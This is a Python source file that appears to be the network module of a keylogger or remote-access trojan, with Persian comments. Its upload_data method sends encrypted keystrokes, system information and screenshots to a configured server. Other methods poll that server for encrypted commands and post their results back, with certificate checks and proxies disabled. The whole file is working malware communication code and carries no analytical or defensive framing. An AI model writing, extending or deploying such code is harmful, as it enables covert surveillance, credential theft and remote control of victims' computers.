# ------------ network/communicator.py ------------
import requests
import json
import logging  # Added import
from config import Config
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class ServerCommunicator:
    def __init__(self, client_id, encryption_manager):
        self.client_id = client_id
        self.encryption = encryption_manager

    def _send_request(self, endpoint, data=None, files=None):
        try:
            endpoint = endpoint.lstrip('?/')
            base_url = Config.SERVER_URL.rstrip('/')
            url = f"{base_url}/{endpoint}"
            response = requests.post(
                url,
                data=data,
                files=files,
                verify=False,
                timeout=Config.COMMAND_TIMEOUT,
                proxies={'http': None, 'https': None}
            )
            return self._handle_response(response)
        except requests.exceptions.RequestException as e:
            raise CommunicationError(f"Connection error: {str(e)}")

    def _handle_response(self, response):
        if response.status_code == 200:
            try:
                data = response.json()

                # اعتبارسنجی ساختار پاسخ سرور
                if not isinstance(data, dict) or 'commands' not in data:
                    raise CommunicationError("Invalid response format: Missing 'commands' key")

                if not isinstance(data['commands'], list):
                    raise CommunicationError("Invalid commands format: Expected list")

                return data['commands']

            except json.JSONDecodeError:
                raise CommunicationError("Invalid JSON response")

        else:
            raise CommunicationError(f"Server error: {response.status_code}")

    def upload_data(self, keystrokes, system_info, screenshot=None):
        try:
            encrypted_data = {
                "action": "upload_data",
                "client_id": self.client_id,
                "token": Config.SECRET_TOKEN,
                "keystrokes": self.encryption.encrypt(' '.join(keystrokes)),
                "system_info": self.encryption.encrypt(json.dumps(system_info))
            }
    
            files = {}
            if screenshot:
                files['screenshot'] = ('screenshot.png', screenshot, 'image/png')
    
            response = requests.post(
                Config.SERVER_URL,
                data=encrypted_data,
                files=files,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False
            )
            
            if response.status_code != 200:
                raise CommunicationError(f"Upload failed: {response.text}")
                
        except Exception as e:
            raise CommunicationError(f"Upload error: {str(e)}")

    def fetch_commands(self):
        try:
            response = self._send_request(
                "?action=get_commands",  # افزودن action به URL
                data={
                    "action": "get_commands",
                    "client_id": self.client_id,
                    "token": Config.SECRET_TOKEN
                }
            )

            logging.info(f"Raw server response for commands: {response}")

            # اعتبارسنجی ساختار پاسخ
            if not isinstance(response, list):
                raise CommunicationError(f"Invalid commands format: {response}")

            validated_commands = []
            for cmd in response:
                # بررسی وجود فیلدهای ضروری
                if not all(k in cmd for k in ('id', 'command')):
                    logging.warning(f"Skipping invalid command: {cmd}")
                    continue

                try:
                    # رمزگشایی دستور برای بررسی فیلد type
                    decrypted = self.encryption.decrypt(cmd['command'])
                    command_data = json.loads(decrypted)

                    if 'type' not in command_data:
                        logging.error(f"Command missing 'type': {command_data}")
                        continue

                    # افزودن فیلد type به دستور
                    cmd['type'] = command_data['type']
                    validated_commands.append(cmd)

                except Exception as e:
                    logging.error(f"Command validation failed: {str(e)}")

            return validated_commands

        except Exception as e:
            raise CommunicationError(f"Failed to process commands: {str(e)}")

    def send_command_result(self, command_id, result):
        return self._send_request(
            "command_response",
            data={
                "command_id": command_id,
                "result": self.encryption.encrypt(json.dumps(result)),
                "token": Config.SECRET_TOKEN
            }
        )

class CommunicationError(Exception):
    pass